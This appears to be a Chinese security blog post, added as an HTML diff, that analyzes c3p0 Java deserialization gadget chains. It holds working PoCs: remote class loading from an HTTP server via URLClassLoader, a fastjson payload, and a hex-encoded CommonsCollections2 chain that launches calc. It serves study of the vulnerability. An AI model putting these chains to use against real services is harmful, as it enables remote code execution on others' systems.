@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+  <head><meta name="referrer" content="no-referrer"/><meta name="generator" content="Hexo 6.3.0"></head>
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      C3P0解析与用法 
+      
+      
+      |
+    
+     Prove yourself
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/myblog.ico">
+    <link rel="icon" href="/images/myblog.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/me.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Aecous</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">C3P0解析与用法</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-07-08 17:24:14
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <p>上依赖</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span>
+    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>com<span class="token punctuation">.</span>mchange<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>
+    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>c3p0<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>
+    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">></span></span><span class="token number">0.9</span><span class="token number">.5</span><span class="token number">.2</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span>
+<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+
+<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1685581949905-2bbaf177-84fb-40e2-aa19-cd36773cd599.png#averageHue=%23fdfdfc&clientId=u5c86c246-7dff-4&from=paste&height=145&id=u83c0c26e&originHeight=217&originWidth=1112&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=65670&status=done&style=none&taskId=u320de1fa-978f-4281-80b8-67452a4743d&title=&width=741.3333333333334" alt="image.png"><br>反序列化流程</p>
+<p>poc</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cp30</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>mchange<span class="token punctuation">.</span>v2<span class="token punctuation">.</span>c3p0<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">PoolBackedDataSourceBase</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>mchange<span class="token punctuation">.</span>v2<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ReferenceIndirector</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Name</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Reference</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Referenceable</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">ConnectionPoolDataSource</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">PooledConnection</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">Naming</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">SQLException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">SQLFeatureNotSupportedException</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>logging<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">URL_poc</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
+        <span class="token class-name">PoolBackedDataSourceBase</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PoolBackedDataSourceBase</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Field</span> f1 <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"connectionPoolDataSource"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//此类是PoolBackedDataSourceBase抽象类的实现</span>
+        f1<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        f1<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token function">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+
+        <span class="token class-name">ObjectOutputStream</span> ser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"a.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ser<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">ObjectInputStream</span> unser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"a.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        unser<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        unser<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> evil <span class="token keyword">implements</span> <span class="token class-name">ConnectionPoolDataSource</span><span class="token punctuation">,</span> <span class="token class-name">Referenceable</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">public</span> <span class="token class-name">PrintWriter</span> getLogWriter <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+        <span class="token keyword">public</span> <span class="token keyword">void</span> setLogWriter <span class="token punctuation">(</span> <span class="token class-name">PrintWriter</span> out <span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+        <span class="token keyword">public</span> <span class="token keyword">void</span> setLoginTimeout <span class="token punctuation">(</span> <span class="token keyword">int</span> seconds <span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+        <span class="token keyword">public</span> <span class="token keyword">int</span> getLoginTimeout <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+        <span class="token keyword">public</span> <span class="token class-name">Logger</span> getParentLogger <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLFeatureNotSupportedException</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+        <span class="token keyword">public</span> <span class="token class-name">PooledConnection</span> getPooledConnection <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+        <span class="token keyword">public</span> <span class="token class-name">PooledConnection</span> getPooledConnection <span class="token punctuation">(</span> <span class="token class-name">String</span> user<span class="token punctuation">,</span> <span class="token class-name">String</span> password <span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
+
+        <span class="token annotation punctuation">@Override</span>
+        <span class="token keyword">public</span> <span class="token class-name">Reference</span> <span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"exp"</span><span class="token punctuation">,</span><span class="token string">"exp"</span><span class="token punctuation">,</span><span class="token string">"http://127.0.0.1:8999/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token comment">//这里记得起一个http服务，将exp.class挂着</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里反射更改的connectionPoolDataSource需要重写接口，是必须要实现的</p>
+<h4 id="这里先讲一下writeObject"><a href="#这里先讲一下writeObject" class="headerlink" title="这里先讲一下writeObject"></a>这里先讲一下writeObject</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687618075949-34bf3d4d-7168-468a-a03c-551abefb8659.png#averageHue=%2331363a&clientId=u209c802c-6cf8-4&from=paste&height=308&id=ue25bf3dd&originHeight=462&originWidth=1344&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=257427&status=done&style=none&taskId=u589b6e56-2254-41d2-9555-39c7c4c562d&title=&width=896" alt="image.png"><br>我们通过反射更改了PoolBackedDataSourceBase类的connectionPoolDataSource参数，将其设置为了</p>
+<blockquote>
+<p>public static class evil implements ConnectionPoolDataSource, Referenceable</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687618130289-f0a25ca4-b42c-4109-b6df-c55f80110fd7.png#averageHue=%23313030&clientId=u209c802c-6cf8-4&from=paste&height=161&id=u593f78dd&originHeight=242&originWidth=421&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=12169&status=done&style=none&taskId=ua6897749-07dc-4d4b-b5d6-3d1460af790&title=&width=280.6666666666667" alt="image.png">这里有一点就是，没有继承序列化的接口<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687618153239-8bc8a53c-d76b-46df-a684-637afd749eb4.png#averageHue=%23313639&clientId=u209c802c-6cf8-4&from=paste&height=297&id=u900b5dd1&originHeight=445&originWidth=1253&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=231537&status=done&style=none&taskId=u426bb827-c99f-4b33-ac01-e1727a5730b&title=&width=835.3333333333334" alt="image.png">所以在writeObject时会报错，进入catch中<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687618170903-c957a05a-37a7-447c-a2c8-907b8c56c24d.png#averageHue=%23313538&clientId=u209c802c-6cf8-4&from=paste&height=65&id=u4a097137&originHeight=97&originWidth=1269&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=49627&status=done&style=none&taskId=u84bf1928-6e57-46a0-88c0-571636a7043&title=&width=846" alt="image.png"><br>这里新建了一个ReferenceIndirector,并调用了其indirectForm方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687618197630-ed30f54a-d089-4f4b-9d16-cf1a2bfdb9a1.png#averageHue=%2332373a&clientId=u209c802c-6cf8-4&from=paste&height=114&id=ufe62f28d&originHeight=171&originWidth=1073&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=91200&status=done&style=none&taskId=uaa4fad7b-7b24-4698-ad93-083d08e7787&title=&width=715.3333333333334" alt="image.png"><br>跟进之后发现，获取了connectionPoolDataSource的Reference方法内容<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687618264463-d1545985-7f71-4cd0-9c5a-21e7b9e425a2.png#averageHue=%234d664d&clientId=u209c802c-6cf8-4&from=paste&height=93&id=u4a4c5301&originHeight=139&originWidth=904&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=51191&status=done&style=none&taskId=ud5b84f29-a048-4dc3-a9b6-858a8127bf4&title=&width=602.6666666666666" alt="image.png"><br>将其作为ReferenceSerialized的参数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687618315087-6005ad6d-718f-4afc-a79b-a81567517edf.png#averageHue=%23404744&clientId=u209c802c-6cf8-4&from=paste&height=185&id=u35804a76&originHeight=277&originWidth=869&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=109004&status=done&style=none&taskId=u79643c6c-6412-4d03-94ed-1df7b8ba0bb&title=&width=579.3333333333334" alt="image.png"><br>之后序列化的操作就不说了</p>
+<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1685581884988-afb35404-013d-4d8e-bfc6-70565617aefe.png#averageHue=%235c5143&clientId=u5c86c246-7dff-4&from=paste&height=678&id=u904ed16f&originHeight=1017&originWidth=1861&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=199701&status=done&style=none&taskId=u70137574-299d-4336-a395-2af3fe71cc7&title=&width=1240.6666666666667" alt="image.png"><br>进入PoolBackedDataSourceBase的readObject，先用readShort获取一个版本号进入switch中的if判断<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1685582028953-65d1b54c-5ff5-46b2-a079-15220618e20c.png#averageHue=%232f2a2a&clientId=u5c86c246-7dff-4&from=paste&height=297&id=ub4c35f61&originHeight=445&originWidth=2050&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=107311&status=done&style=none&taskId=ude6d2fcc-218f-4d0f-b795-dcdb04a0f82&title=&width=1366.6666666666667" alt="image.png"><br>判断o是否继承IndirectlySerialized，此处的o是writeObject时处理过的ReferenceSerialized<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1685582103897-6596bb9b-891c-4328-9394-fa6e50856add.png#averageHue=%232d2c2b&clientId=u5c86c246-7dff-4&from=paste&height=201&id=u60865a7e&originHeight=301&originWidth=1220&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=27592&status=done&style=none&taskId=ucfe0827c-ed24-48ec-bc32-f00bfebb0d2&title=&width=813.3333333333334" alt="image.png"><br>满足条件，进入getObject<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1685582139319-24a4ea45-e79b-4591-9d51-8cce78420901.png#averageHue=%232c2b2b&clientId=u5c86c246-7dff-4&from=paste&height=410&id=uec176928&originHeight=615&originWidth=1967&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=103255&status=done&style=none&taskId=u18bcfd2b-dfc9-4fc4-8441-9bbce173f16&title=&width=1311.3333333333333" alt="image.png">contextName为null。没有进入if，进入了下面的return<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1685582600171-adc2ad2a-fac6-4df5-946c-b0208c504e2e.png#averageHue=%232c2b2b&clientId=u5c86c246-7dff-4&from=paste&height=541&id=uc302d0bb&originHeight=811&originWidth=1920&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=161928&status=done&style=none&taskId=uab4df010-f461-4dfb-bb72-1c31085502c&title=&width=1280" alt="image.png"><br>从fClassLocation中获取地址，用URLClassLoader远程加载类<br>这里因为用的Class.forName，并且第二参数为true，就会直接加载其静态方法，所以不需要newInstance就可以弹出计算器<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35213294/1687618576720-a4bd687b-40ca-4064-b9e4-fcb2516888b1.png#averageHue=%23454943&clientId=u209c802c-6cf8-4&from=paste&height=515&id=u6405332f&originHeight=772&originWidth=1171&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=337437&status=done&style=none&taskId=u022dfc87-f503-4010-9038-53b8ffe5889&title=&width=780.6666666666666" alt="image.png"></p>
+<h3 id="Hex-base-一般用于fastjson"><a href="#Hex-base-一般用于fastjson" class="headerlink" title="Hex_base  一般用于fastjson"></a>Hex_base  一般用于fastjson</h3><p>fastjson exp</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>
+    <span class="token string">"a"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
+        <span class="token string">"val"</span><span class="token operator">:</span> <span class="token string">"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+    <span class="token string">"b"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"</span><span class="token punctuation">,</span>
+        <span class="token string">"userOverridesAsString"</span><span class="token operator">:</span> <span class="token string">"HexAsciiSerializedMap:hex编码内容;"</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>poc</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">cp30</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">cc<span class="token punctuation">.</span>tools</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>mchange<span class="token punctuation">.</span>v2<span class="token punctuation">.</span>c3p0<span class="token punctuation">.</span></span><span class="token class-name">WrapperConnectionPoolDataSource</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> hex_base <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
+
+        <span class="token class-name">Object</span> o <span class="token operator">=</span> tools<span class="token punctuation">.</span><span class="token function">cc2_poc</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> cc2_poc <span class="token operator">=</span> tools<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytein <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>cc2_poc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//获取cc2的bytes</span>
+
+        <span class="token comment">//固定的拼接</span>
+        <span class="token class-name">String</span> <span class="token class-name">Hex</span> <span class="token operator">=</span> <span class="token string">"HexAsciiSerializedMap:"</span><span class="token operator">+</span><span class="token function">bytesToHexString</span><span class="token punctuation">(</span>bytein<span class="token punctuation">,</span>bytein<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"p"</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Hex</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">WrapperConnectionPoolDataSource</span> exp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WrapperConnectionPoolDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        exp<span class="token punctuation">.</span><span class="token function">setUserOverridesAsString</span><span class="token punctuation">(</span><span class="token class-name">Hex</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">//此处就触发</span>
+
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">bytesToHexString</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bArray<span class="token punctuation">,</span> <span class="token keyword">int</span> length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">StringBuffer</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token class-name">String</span> sTemp <span class="token operator">=</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toHexString</span><span class="token punctuation">(</span><span class="token number">255</span> <span class="token operator">&amp;</span> bArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>sTemp<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>sTemp<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
